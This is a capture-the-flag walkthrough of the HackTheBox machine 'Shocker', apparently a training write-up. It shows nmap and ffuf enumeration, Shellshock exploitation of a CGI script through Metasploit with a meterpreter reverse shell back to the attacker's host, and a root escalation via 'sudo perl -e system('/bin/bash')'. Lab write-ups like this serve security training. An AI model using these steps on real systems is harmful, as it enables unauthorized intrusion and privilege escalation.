# Shocker | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.48]─[htb-jib1337@htb-bzghcnhtz1]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.1.175
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-22 13:30 UTC
Nmap scan report for 10.129.1.175
Host is up (0.22s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=11/22%OT=80%CT=1%CU=38512%PV=Y%DS=2%DC=T%G=Y%TM=5FBA68
OS:89%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8)OP
OS:S(O1=M54DST11NW6%O2=M54DST11NW6%O3=M54DNNT11NW6%O4=M54DST11NW6%O5=M54DST
OS:11NW6%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 1723/tcp)
HOP RTT       ADDRESS
1   223.41 ms 10.10.14.1
2   223.58 ms 10.129.1.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 155.69 seconds
```
The machine is running Apache 2.4.18 and SSH.

### 2. Enumeration
When browsing to the machine over a web browser, a single page is returned with an image of a bug hitting itself with a hammer and some text - "Don't bug me!". When scanning for files and directories, I find a cgi-bin and icons, both cannot be read. I don't find any other files. However, knowing there may be CGI scripts is valuable information. The name of the box is a bit of a hint here, I can try to exploit the Apache mod_cgi (shellshock) to get command execution. Of course it relies on a vulnerable version of bash being installed which I have no idea if this is the case, so without the machine name this would be a wild shot in the dark.
  
Still, I need to enumerate the cgi-bin directory first to find a script to target.
```bash
┌──(kali㉿kali)-[~]
└─$ ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.129.1.175/cgi-bin/FUZZ -e .cgi,.sh

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.2.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.1.175/cgi-bin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Extensions       : .cgi .sh 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

user.sh                 [Status: 200, Size: 118, Words: 19, Lines: 8]
[WARN] Caught keyboard interrupt (Ctrl-C)
```
A script called user.sh exists in the cgi-bin directory. Finally I can use metasploit to check the script and see if the exploit will work using it.
```bash
msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > options

Module options (auxiliary/scanner/http/apache_mod_cgi_bash_env):

   Name       Current Setting   Required  Description
   ----       ---------------   --------  -----------
   CMD        /usr/bin/id       yes       Command to run (absolute paths required)
   CVE        CVE-2014-6271     yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER     User-Agent        yes       HTTP header to use
   METHOD     GET               yes       HTTP method to use
   Proxies                      no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     10.129.1.175      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80                yes       The target port (TCP)
   SSL        false             no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /cgi-bin/user.sh  yes       Path to CGI script
   THREADS    1                 yes       The number of concurrent threads (max one per host)
   VHOST                        no        HTTP server virtual host

msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > run

[+] uid=1000(shelly) gid=1000(shelly) groups=1000(shelly),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
It does.

### 3. Get a shell
```bash
msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > options

Module options (exploit/multi/http/apache_mod_cgi_bash_env_exec):

   Name            Current Setting   Required  Description
   ----            ---------------   --------  -----------
   CMD_MAX_LENGTH  2048              yes       CMD max line length
   CVE             CVE-2014-6271     yes       CVE to check/exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HEADER          User-Agent        yes       HTTP header to use
   METHOD          GET               yes       HTTP method to use
   Proxies                           no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS          10.129.1.175      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPATH           /bin              yes       Target PATH for binaries used by the CmdStager
   RPORT           80                yes       The target port (TCP)
   SRVHOST         0.0.0.0           yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT         8080              yes       The local port to listen on.
   SSL             false             no        Negotiate SSL/TLS for outgoing connections
   SSLCert                           no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI       /cgi-bin/user.sh  yes       Path to CGI script
   TIMEOUT         5                 yes       HTTP read response timeout (seconds)
   URIPATH                           no        The URI to use for this exploit (default is random)
   VHOST                             no        HTTP server virtual host


Payload options (linux/x86/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.48      yes       The listen address (an interface may be specified)
   LPORT  9999             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Linux x86


msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > run

[*] Started reverse TCP handler on 10.10.14.48:9999 
[*] Command Stager progress - 100.46% done (1097/1092 bytes)
[*] Sending stage (976712 bytes) to 10.129.1.175
[*] Meterpreter session 1 opened (10.10.14.48:9999 -> 10.129.1.175:45180) at 2020-11-22 10:14:56 -0500

meterpreter > getuid
Server username: shelly @ Shocker (uid=1000, gid=1000, euid=1000, egid=1000)
meterpreter > sysinfo
Computer     : 10.129.1.175
OS           : Ubuntu 16.04 (Linux 4.4.0-96-generic)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
```

### 4. Enumerate from foothold
First thing to try is checking sudo.  
```bash
shelly@Shocker:~$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
I can run perl as root, with no password required.

### 5. Escalate to root
I can escalate by making use of the system() function and calling /bin/bash.
```bash
shelly@Shocker:~$ sudo perl -e "system('/bin/bash')"
sudo perl -e "system('/bin/bash')"
root@Shocker:~# whoami
whoami
root
```

### Notes

I made my own exploit tool for shellshock - see shocker.py.
